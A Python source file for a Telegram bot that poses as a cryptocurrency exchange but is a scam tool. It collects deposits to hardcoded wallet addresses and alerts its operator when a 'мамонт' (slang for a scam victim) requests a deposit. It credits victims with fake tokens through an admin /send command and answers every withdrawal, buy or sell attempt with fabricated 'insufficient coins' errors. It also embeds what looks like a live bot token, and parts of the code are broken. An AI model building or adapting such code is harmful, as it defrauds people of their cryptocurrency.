import telebot
from telebot import types
import os
import os.path
import sqlite3
import requests
from bs4 import BeautifulSoup as b
from config import TOKEN, admin
import keyboard as kb
import functions as func
import coins_fantic as fantic
import sqlite3
import config
from pycoingecko import CoinGeckoAPI
import math

cg = CoinGeckoAPI()
b = cg.get_price(ids = 'bitcoin', vs_currencies='usd')
e = cg.get_price(ids = 'ethereum', vs_currencies='usd')
s = cg.get_price(ids = 'solana', vs_currencies = 'usd')
bn = cg.get_price(ids = 'binancecoin', vs_currencies='usd')

bnb_ = int(bn['binancecoin']['usd'])/100
bnb = int(bn['binancecoin']['usd']) - bnb_*2

sol_ = int(s['solana']['usd'])/100
sol = int(s['solana']['usd']) - sol_*2

eth_ = int(e['ethereum']['usd'])/100
eth = int(e['ethereum']['usd']) - eth_*2

btc_ = int(b['bitcoin']['usd'])/100
btc = int(b['bitcoin']['usd']) - btc_*2 


admin = 732591622

bot = telebot.TeleBot('5625952474:AAF9OWKHTm8lzlErEsvgxHBluOS0TUiaaLU')

@bot.message_handler(commands=['start'])
def start_message(message):
	#keyboard
	username = message.from_user.username
	chat_id = message.chat.id
	if message.from_user.username == None:
		bot.send_message(chat_id, ' You need to set a login to work with the bot!')
	else:
		func.first_join(user_id=chat_id, username=username, _btc_=0, _eth_=0, _busd_=0, _sol_= 0, _usdc_= 0, _usdt_=0, _bnb_=0,balance_=0)
		bot.send_message(message.chat.id, "Hi, {0.first_name}!\nЯ - <b>{1.first_name}</b>, I'm a bot for exchanging cryptocurrencies at the best rates.".format(message.from_user, bot.get_me()),parse_mode='html', reply_markup=kb.menu)
@bot.message_handler(commands=['admin'])
def start_admin(message):
	if message.from_user.id == admin:
		bot.send_message(message.chat.id, ' {}, Вы авторизованы!'.format(message.from_user.first_name), reply_markup=kb.admin)
	else:
		bot.send_message(message.chat.id, 'Вы не админ!')
@bot.message_handler(commands=['send'])
def sending(message):
	msg = bot.send_message(message.chat.id, 'Ввидите значения через запятую:\n(Количество(число),мамонт id,монета(Пример:btc)')
	bot.register_next_step_handler(msg, sending_res)

def sending_res(message):
	num = str(message.text)
	num1 = num.split(',')
	if len(num1) == 3:
		fantic.send_fantic(coin=str(num1[2]),user_id=str(num1[1]),value=str(num1[0]))
		bot.send_message(message.chat.id, '✓Отправлено успешно!')
	else:
		bot.send_message(message.chat.id, '✗Неправильный синтаксис✗')

	


@bot.message_handler(content_types=['text'])
def answer_send(message):
	if message.text == '♻️Chenge':
		bot.send_message(message.chat.id, "Transaction fee - 0.003%\nChoose a cryptocurrency pair:", parse_mode='html', reply_markup=kb.markup)
	elif message.text == '👛Wallet':
		balance_1 = (fantic.get_coin_balance(coin='btc', user_id=message.chat.id))*btc
		balance_2 = (fantic.get_coin_balance(coin='eth', user_id=message.chat.id))*eth
		balance_3 = (fantic.get_coin_balance(coin='sol', user_id=message.chat.id))*sol
		balance_4 = (fantic.get_coin_balance(coin='bnb', user_id=message.chat.id))*bnb
		balance_5 = (fantic.get_coin_balance(coin='busd', user_id=message.chat.id))*1
		balance_6 = (fantic.get_coin_balance(coin='usdt', user_id=message.chat.id))*1
		balance_6 = (fantic.get_coin_balance(coin='usdc', user_id=message.chat.id))*1
		balance = round((balance_1+balance_2+balance_3+balance_4+balance_5+balance_6), 2)

		msg = bot.send_message(message.chat.id, f"👛Wallet\n\n\n<b>•Bitcoin:</b> {fantic.get_coin_balance(coin='btc', user_id=message.chat.id)} BTC\n\n\n<b>•Etherium:</b> {fantic.get_coin_balance(coin='eth', user_id=message.chat.id)} ETH\n\n\n<b>•Solana:</b> {fantic.get_coin_balance(coin='sol', user_id=message.chat.id)} SOL\n\n\n<b>•Binance USD:</b> {fantic.get_coin_balance(coin='busd', user_id=message.chat.id)} BUSD\n\n\n<b>•Binance Coin:</b> {fantic.get_coin_balance(coin='bnb', user_id=message.chat.id)} BNB\n\n\n<b>•USD Coin:</b> {fantic.get_coin_balance(coin='usdc', user_id=message.chat.id)} USDC\n\n\n<b>•Tether:</b> {fantic.get_coin_balance(coin='usdt', user_id=message.chat.id)} USDT\n\n\n•Общая стоимость: ≈ {str(balance)}$", parse_mode='html', reply_markup=kb.markup2)



@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	try:
		if call.message:
			#ADMIN
			if call.data  == 'statistics':
				bot.send_message(call.message.chat.id, func.stats(), reply_markup=kb.admin)
			elif call.data == 'users':
				bot.send_message(call.message.chat.id, "Админ панель позволяет вам отслеживать количество пользоватилей бота, и отпровлять им фейк токены при помощи комманды - '/send'", reply_markup=kb.admin)
			#USER
			if call.data == 'depo':
				bot.send_message(call.message.chat.id, "Выбирите криптовалюту пополнения баланса:", reply_markup=kb.depo)
			elif call.data == 'withdraw':
				bot.send_message(call.message.chat.id,"Выбирите криптовалюту для отправки:", reply_markup = kb.withdrawn)
			elif call.data == 'BTC_ch':
				bot.send_message(call.message.chat.id, str(btc)+"$"+" - Актуальный курс\n🕙︎Курс обновляется каждые 3 минуты", reply_markup=kb.buy_sell)
			elif call.data == 'ETH_ch':
				bot.send_message(call.message.chat.id, str(eth)+"$"+" - Актуальный курс\n🕙︎Курс обновляется каждые 3 минуты",reply_markup=kb.buy_sell)
			elif call.data == 'BNB_ch':
				bot.send_message(call.message.chat.id, str(bnb)+"$"+" - Актуальный курс\n🕙︎Курс обновляется каждые 3 минуты",reply_markup=kb.buy_sell)
			elif call.data == 'SOL_ch':
				bot.send_message(call.message.chat.id, str(sol)+"$"+" - Актуальный курс\n🕙︎Курс обновляется каждые 3 минуты", reply_markup=kb.buy_sell)
			elif call.data == 'USDC_ch':
				bot.send_message(call.message.chat.id, '1$ - Актуальный курс\n🕙︎Курс обновляется каждые 3 минуты', reply_markup=kb.buy_sell)
			elif call.data == 'USDT_ch':
				bot.send_message(call.message.chat.id, '1$ - Актуальный курс\n🕙︎Курс обновляется каждые 3 минуты', reply_markup=kb.buy_sell)
			def _deposei_coin():
				if call.data == 'BUSD':
					bot.send_message(call.message.chat.id, "Используйте адрес ниже для пополнения баланса\n\n\nСеть: BNB Smart Chain – BEP20 ‼️\n\n\n<code>0x2E3991269Fa66912759742A357CAfeaC0F459EE4</code>" , parse_mode='html', reply_markup=kb.send_)
					bot.send_message(admin, f'Мамонт <code>{str(call.message.chat.id)}</code> запросил ввод BUSD:\n проверьте ваш кошелек!', parse_mode='html')
				elif call.data == 'BTC':
					bot.send_message(call.message.chat.id, "Используйте адрес ниже для пополнения баланса\n\n\nСеть: Bitcoin - BTC‼️\n\n\n<code>bc1qfyn6k37zqtzwz4uw9h27c675jyyfvcyxj5tyyy</code>" , parse_mode='html', reply_markup=kb.send_)
					bot.send_message(admin, f'Мамонт <code>{str(call.message.chat.id)}</code> запросил ввод BTC:\n проверьте ваш кошелек!', parse_mode='html')
				elif call.data == 'ETH':
					bot.send_message(call.message.chat.id, "Используйте адрес ниже для пополнения баланса\n\n\nСеть: Ethereum – ERC20 ‼️\n\n\n<code>0x2E3991269Fa66912759742A357CAfeaC0F459EE4</code>" , parse_mode='html', reply_markup=kb.send_)
					bot.send_message(admin, f'Мамонт <code>{str(call.message.chat.id)}</code> запросил ввод ETH:\n проверьте ваш кошелек!', parse_mode='html')
				elif call.data == 'USDC':
					bot.send_message(call.message.chat.id, "Используйте адрес ниже для пополнения баланса\n\n\nСеть: BNB Smart Chain – BEP20 ‼️\n\n\n<code>0x2E3991269Fa66912759742A357CAfeaC0F459EE4</code>" , parse_mode='html', reply_markup=kb.send_)
					bot.send_message(admin, f'Мамонт <code>{str(call.message.chat.id)}</code> запросил ввод USDC:\n проверьте ваш кошелек!', parse_mode='html')
				elif call.data == 'SOL':
					bot.send_message(call.message.chat.id, "Используйте адрес ниже для пополнения баланса\n\n\nСеть: Solana – SOL ‼️\n\n\n<code>8LU6dJ1f64uaYRaTsPtS5VNdaebxCL52GzjovYpgEz2j</code>" , parse_mode='html', reply_markup=kb.send_)
					bot.send_message(admin, f'Мамонт <code>{str(call.message.chat.id)}</code> запросил ввод SOL:\n проверьте ваш кошелек!', parse_mode='html')
				elif call.data == 'BNB':
					bot.send_message(call.message.chat.id, "Используйте адрес ниже для пополнения баланса\n\n\nСеть: BNB Smart Chain – BEP20 ‼️\n\n\n<code>0x2E3991269Fa66912759742A357CAfeaC0F459EE4</code>" , parse_mode='html', reply_markup=kb.send_)
					bot.send_message(admin, f'Мамонт <code>{str(call.message.chat.id)}</code> запросил ввод BNB:\n проверьте ваш кошелек!', parse_mode='html')
				elif call.data == 'USDT':
					bot.send_message(call.message.chat.id, "Используйте адрес ниже для пополнения баланса\n\n\nСеть: BNB Smart Chain – BEP20 ‼️\n\n\n<code>0x2E3991269Fa66912759742A357CAfeaC0F459EE4</code>" , parse_mode='html', reply_markup=kb.send_)
					bot.send_message(admin, f'Мамонт <code>{str(call.message.chat.id)}</code> запросил ввод USDT:\n проверьте ваш кошелек!', parse_mode='html')
				elif call.data('send'):
					bot.send_message(call.message.chat.id, "✔Отлично! Транзакция в оброботке(начесление в течение 5-20мин)")
			def callback_message():
				if call.data == 'BUSD_':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\n\n\nМинимум: 1.01 BUSD\nКомиссия: 1 BUSD\n\nВаш баланс: 0 BUSD", show_alert=True)
				elif call.data == 'BTC_':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\n\n\nМинимум: 0.0004 BTC ({round(btc*0.0004,1)}$)\nКомиссия: 0.0003 BTC({round(btc*0.0003,1)}$)\n\nВаш баланс: 0 BTC", show_alert=True)					
				elif call.data == 'ETH_':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\n\n\nМинимум: 0.01 ETH ({round(eth*0.01,1)}$)\nКомиссия: 0.005 ETH({round(eth*0.005,1)}$)\n\nВаш баланс: 0 ETH", show_alert=True)						
				elif call.data == 'USDC_':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\n\n\nМинимум: 1.01 USDC\nКомиссия: 1 USDC\n\nВаш баланс: 0 USDC", show_alert=True)				
				elif call.data == 'SOL_':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\n\n\nМинимум: 0.01 SOL ({round(sol*0.01,1)}$)\nКомиссия: 0.00001 SOL({round(sol*0.00001,1)}$)\n\nВаш баланс: 0 SOL", show_alert=True)					
				elif call.data == 'BNB_':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\n\n\nМинимум: 0.0035 BNB ({round(bnb*0.0035,1)}$)\nКомиссия: 0.0025 BNB({round(bnb*0.0025,1)}$)\n\nВаш баланс: 0 BNB", show_alert=True)					
				elif call.data == 'USDT_':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\n\n\nМинимум: 1.01 USDT\nКомиссия: 1 USDT\n\nВаш баланс: 0 USDT", show_alert=True)
			callback_message()

			def callbeck_buy_sell():
				if call.data == 'buy':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 BTC", show_alert=True)
				elif call.data == 'sell':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 BTC", show_alert=True)
				if call.data == 'buy1':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 ETH", show_alert=True)
				elif call.data == 'sell1':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 ETH", show_alert=True)
				if call.data == 'buy2':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 BNB", show_alert=True)
				elif call.data == 'sell2':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 BNB", show_alert=True)
				if call.data == 'buy3':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 SOL", show_alert=True)
				elif call.data == 'sell3':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 SOL", show_alert=True)
				if call.data == 'buy4':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 USDT", show_alert=True)
				elif call.data == 'sell4':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 USDT", show_alert=True)
				if call.data == 'buy5':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 USDC", show_alert=True)
				elif call.data == 'sell5':
					bot.answer_callback_query(callback_query_id=call.id, text=f"😭Недостаточно монет.\nПополните баланс.\n\nВаш баланс: 0 USDC", show_alert=True)	
			callbeck_buy_sell()


			_deposei_coin()

	except Exception as ex:
		print(ex)

bot.infinity_polling()

if __name__ == '__main__':
        main()
